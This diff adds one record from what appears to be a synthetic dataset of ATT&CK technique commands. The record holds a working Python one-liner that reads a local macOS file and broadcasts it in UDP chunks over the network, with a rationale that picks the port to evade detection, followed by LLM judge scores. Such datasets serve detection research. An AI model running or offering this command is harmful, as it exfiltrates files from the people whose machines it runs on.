@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); addr=(\"255.255.255.255\", 49876); d=open(\"/Users/Shared/.sync.log\",\"rb\").read(); [s.sendto(d[i:i+1024], addr) for i in range(0,len(d),1024)]; s.close()'",
+  "explanation": "Exfiltrates data via IPv4 broadcast UDP on a non-standard high port, using local broadcast as an alternative network medium separate from a primary unicast channel, consistent with T1011.",
+  "rationale_steps": [
+    "Create an IPv4 UDP socket and enable broadcast.",
+    "Target the broadcast address with an uncommon port (49876) to reduce detection.",
+    "Chunk and transmit data as UDP datagrams (broadcast medium distinct from typical unicast C2).",
+    "No obfuscation; user-level safe."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-d7687590",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses with valid Python one-liner statements, proper socket setup, file read, and loop, so it should parse and run.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates reading a file and sending it in 1KB chunks via UDP broadcast without elevated privileges, consistent with automated exfiltration, though it lacks scheduling/retry and depends on file presence and broadcast reachability.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:24:11.949600Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, proper semicolons, valid Python syntax for imports, socket configuration, file operations, and list comprehension.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by reading a potentially sensitive file (/Users/Shared/.sync.log) and transmitting its contents in 1024-byte chunks via UDP broadcast to port 49876, aligning perfectly with the T1011 technique description.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:24:15.034527Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code enclosed within the single quotes is perfectly well-formed, using correct syntax for imports, socket operations, file handling, and list comprehension, all executable via 'python3 -c'.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of exfiltrating data via IPv4 broadcast UDP on a non-standard high port by chunking a local file and sending it to 255.255.255.255, which is an operationally plausible automated exfiltration technique consistent with T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:43:19.296283Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
